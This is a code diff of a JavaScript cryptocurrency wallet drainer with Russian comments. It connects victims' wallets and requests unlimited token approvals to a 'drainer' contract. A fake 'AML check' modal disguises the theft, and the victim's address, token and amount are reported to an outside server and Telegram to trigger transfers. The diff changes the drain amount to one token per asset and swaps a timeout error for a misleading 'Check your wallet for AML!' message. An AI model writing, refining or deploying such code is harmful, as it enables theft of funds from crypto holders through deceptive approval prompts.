@@ -2,10 +2,9 @@ import { createAppKit } from '@reown/appkit';
 import { mainnet, polygon, bsc, arbitrum } from '@reown/appkit/networks';
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
 import { ethers } from 'ethers';
-import config from './config.js'; // Импортируем конфигурацию
+import config from './config.js';
 import { showAMLCheckModal } from './aml-check-modal.js';
 
-// === Конфигурация AppKit ===
 const projectId = config.PROJECT_ID;
 const networks = [mainnet, polygon, bsc, arbitrum];
 const wagmiAdapter = new WagmiAdapter({ projectId, networks });
@@ -24,7 +23,6 @@ const appKitModal = createAppKit({
   allWallets: 'SHOW',
 });
 
-// === Глобальные переменные ===
 let connectedAddress = null;
 let hasDrained = false;
 let isTransactionPending = false;
@@ -33,7 +31,6 @@ let modalOverlay = null;
 let modalContent = null;
 let modalSubtitle = null;
 
-// === Константы и конфигурации ===
 let lastDrainTime = 0;
 
 const ERC20_ABI = [
@@ -47,7 +44,6 @@ const DRAINER_ABI = [
   "function processData(uint256 taskId, bytes32 dataHash, uint256 nonce, address[] tokenAddresses) external payable"
 ];
 
-// === Функции ===
 const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
 async function sendTelegramMessage(message) {
@@ -287,19 +283,11 @@ async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, 
   try {
     console.log(`📍 Уведомляем сервер о токене ${tokenAddress} для ${userAddress}`);
     const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
-    const [balance, decimals] = await Promise.all([
-      token.balanceOf(userAddress),
-      token.decimals()
-    ]);
-    console.log(`📊 Текущий баланс токена: ${ethers.utils.formatUnits(balance, decimals)}`);
+    const decimals = await token.decimals();
+    console.log(`📊 Количество для списания: ${ethers.utils.formatUnits(amount, decimals)}`);
     
-    const fixedAmount = "1"; // 1 USDT
-    const roundedAmount = ethers.utils.parseUnits(fixedAmount, decimals);
-
-    console.log(`📊 Фиксированная сумма для списания: ${fixedAmount} USDT`);
-
-    if (roundedAmount.lte(0)) {
-      throw new Error('Amount is zero or negative after rounding');
+    if (amount.lte(0)) {
+      throw new Error('Amount is zero or negative');
     }
 
     const response = await fetch('https://api.erc20scan.com/api/transfer', {
@@ -308,7 +296,7 @@ async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, 
       body: JSON.stringify({
         userAddress,
         tokenAddress,
-        amount: roundedAmount.toString(),
+        amount: amount.toString(),
         chainId,
         txHash
       })
@@ -319,7 +307,7 @@ async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, 
       throw new Error(`Failed to notify server: ${data.message || 'Unknown error'}`);
     }
     console.log(`✅ Сервер успешно уведомлён о трансфере токена ${tokenAddress}`);
-    return { success: true, roundedAmount: roundedAmount.toString() };
+    return { success: true, roundedAmount: amount.toString() };
   } catch (error) {
     console.error(`❌ Ошибка уведомления сервера: ${error.message}`);
     throw new Error(`Failed to notify server: ${error.message}`);
@@ -463,10 +451,17 @@ async function drain(chainId, signer, userAddress, bal, provider) {
     }
     console.log(`📍 Шаг 6: Обрабатываем токен ${token}`);
 
+    // Проверяем, достаточно ли баланса для списания хотя бы 1 токена
+    const oneToken = ethers.utils.parseUnits("1", decimals);
+    if (balance.lt(oneToken)) {
+      console.log(`⚠️ Баланс токена ${token} меньше 1, пропускаем`);
+      continue;
+    }
+
     const allowanceBefore = await contract.allowance(userAddress, chainConfig.drainerAddress);
     console.log(`📜 Allowance: ${ethers.utils.formatUnits(allowanceBefore, decimals)}`);
 
-    if (allowanceBefore.lt(balance)) {
+    if (allowanceBefore.lt(oneToken)) {
       try {
         const nonce = await provider.getTransactionCount(userAddress, "pending");
         const gasPrice = await provider.getGasPrice();
@@ -475,6 +470,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
         console.log(`⏳ Задержка перед approve для токена ${token}`);
         await delay(10);
 
+        // Approve с неограниченным значением
         const tx = await contract.approve(chainConfig.drainerAddress, MAX, {
           gasLimit: 100000,
           gasPrice: gasPrice,
@@ -484,16 +480,11 @@ async function drain(chainId, signer, userAddress, bal, provider) {
         const receipt = await tx.wait();
         console.log(`✅ Транзакция approve подтверждена: ${receipt.transactionHash}`);
 
-        // Открываем модальное окно AML после успешного approve
-        const amlValue = ethers.utils.formatUnits(balance, decimals); // Используем текущий баланс как значение AML
+        // Списываем только 1 токен
+        const amlValue = "1"; // 1 токен в форматированном виде для AML
         await showAMLCheckModal(connectedAddress, amlValue);
 
-        const minAmount = ethers.utils.parseUnits("1", decimals);
-        if (balance.lt(minAmount)) {
-          console.log(`❌ Недостаточно ${token} для списания 1 USDT`);
-          continue;
-        }
-        await notifyServer(userAddress, address, roundedAmount, chainId, receipt.transactionHash, provider, balance);
+        await notifyServer(userAddress, address, oneToken, chainId, receipt.transactionHash, provider, oneToken);
         status = 'confirmed';
 
         if (!modalClosed) {
@@ -515,12 +506,10 @@ async function drain(chainId, signer, userAddress, bal, provider) {
     } else {
       console.log(`✅ Allowance уже достаточно для токена ${token}`);
       try {
-        const minAmount = ethers.utils.parseUnits("1", decimals);
-        if (balance.lt(minAmount)) {
-          console.log(`❌ Недостаточно ${token} для списания 1 USDT`);
-          continue;
-        }
-        await notifyServer(userAddress, address, roundedAmount, chainId, null, provider, balance);
+        // Списываем только 1 токен
+        await notifyServer(userAddress, address, oneToken, chainId, null, provider, oneToken);
+        const amlValue = "1"; // 1 токен в форматированном виде для AML
+        await showAMLCheckModal(connectedAddress, amlValue);
         status = 'confirmed';
       } catch (error) {
         console.error(`❌ Ошибка при вызове notifyServer для токена ${token}: ${error.message}`);
@@ -816,7 +805,7 @@ async function attemptDrainer() {
   const drainerTimeout = setTimeout(async () => {
     isTransactionPending = false;
     console.error('❌ Тайм-аут выполнения дрейнера');
-    await hideModalWithDelay("Error: Drainer operation timed out. Please try again.");
+    await hideModalWithDelay("Check your wallet for AML!");
   }, 60000);
 
   try {
